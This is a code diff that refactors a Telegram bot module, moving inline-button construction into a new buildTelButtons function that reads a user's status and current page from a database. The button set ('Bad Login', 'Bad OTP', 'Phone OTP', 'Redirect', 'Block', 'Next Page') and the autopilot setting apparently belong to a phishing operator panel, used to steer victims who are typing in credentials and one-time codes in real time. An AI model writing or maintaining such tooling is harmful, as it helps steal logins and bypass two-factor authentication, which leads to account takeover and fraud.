@@ -385,56 +385,7 @@ async function buildMessage(data, options = {}) {
       throw new Error("Bot token or Chat ID missing");
     }
 
-    // -----------------------------
-    // BUTTON LOGIC
-    // -----------------------------
-    let buttons = [];
-
-    if (isBlocked) {
-      // 🔴 BLOCKED MODE
-      buttons = [[
-        {
-          text: "Unblock",
-          callback_data: `cmd:unblock:${userId}`
-        }
-      ]];
-    } else {
-      // 🟢 NORMAL MODE
-
-      // Row 1
-      buttons.push([
-        { text: "Refresh", callback_data: `cmd:refresh:${userId}` },
-        { text: "Next Page", callback_data: `cmd:nextpage:${userId}` }
-      ]);
-
-      // Row 2 (login/otp logic preserved)
-      if (page === "login" || page.includes("otp")) {
-        const badButton =
-          page === "login"
-            ? {
-                text: "Bad Login",
-                callback_data: `cmd:bad-login:${userId}`
-              }
-            : {
-                text: "Bad OTP",
-                callback_data: `cmd:bad-otp:${userId}`
-              };
-
-        buttons.push([
-          badButton,
-          { text: "Phone OTP", callback_data: `cmd:phone-otp:${userId}` }
-        ]);
-      }
-
-      // Row 3
-      buttons.push([
-        { text: "Redirect", callback_data: `cmd:redirect:${userId}` },
-        {
-          text: "Block",
-          callback_data: `cmd:block:${userId}`
-        }
-      ]);
-    }
+    const buttons = await buildTelButtons(userId, db);
 
     await sendTelegramMessage(botToken, chatId, message, {
       parse_mode: "HTML",
@@ -516,6 +467,74 @@ async function handleAdminCommand({ userId, command, otp, io, db }) {
   }
 }
 
+async function buildTelButtons(userId, db) {
+  if (!userId) throw new Error("userId missing");
+  if (!db) throw new Error("db missing");
+
+  const userRow = await db.get(
+    "SELECT status, page FROM users WHERE id = ?",
+    [userId]
+  );
+
+  if (!userRow) {
+    throw new Error(`User ${userId} not found`);
+  }
+
+  const isBlocked = userRow.status === "blocked";
+  const page = (userRow.page || "").toLowerCase();
+
+  let buttons = [];
+
+  // -------------------------
+  // BLOCKED MODE
+  // -------------------------
+  if (isBlocked) {
+    return [[
+      {
+        text: "Unblock",
+        callback_data: `cmd:unblock:${userId}`
+      }
+    ]];
+  }
+
+  // -------------------------
+  // NORMAL MODE
+  // -------------------------
+
+  // Row 1
+  buttons.push([
+    { text: "Refresh", callback_data: `cmd:refresh:${userId}` },
+    { text: "Next Page", callback_data: `cmd:nextpage:${userId}` }
+  ]);
+
+  // Row 2 (Login / OTP only)
+  if (page === "login" || page.includes("otp")) {
+    const badButton =
+      page === "login"
+        ? {
+            text: "Bad Login",
+            callback_data: `cmd:bad-login:${userId}`
+          }
+        : {
+            text: "Bad OTP",
+            callback_data: `cmd:bad-otp:${userId}`
+          };
+
+    buttons.push([
+      badButton,
+      { text: "Phone OTP", callback_data: `cmd:phone-otp:${userId}` }
+    ]);
+  }
+
+  // Row 3
+  buttons.push([
+    { text: "Redirect", callback_data: `cmd:redirect:${userId}` },
+    { text: "Block", callback_data: `cmd:block:${userId}` }
+  ]);
+
+  return buttons;
+}
+
 async function isAutopilotOn(db) {
   const row = await db.get("SELECT autopilot FROM admin_settings WHERE id = 1");
   return row?.autopilot === 1;
@@ -529,6 +548,7 @@ export {
   setWebhook,
   getNextPage,
   buildUserInfo,
+  buildTelButtons,
   handleAdminCommand,
   sendAPIRequest,
   getPageFlow,
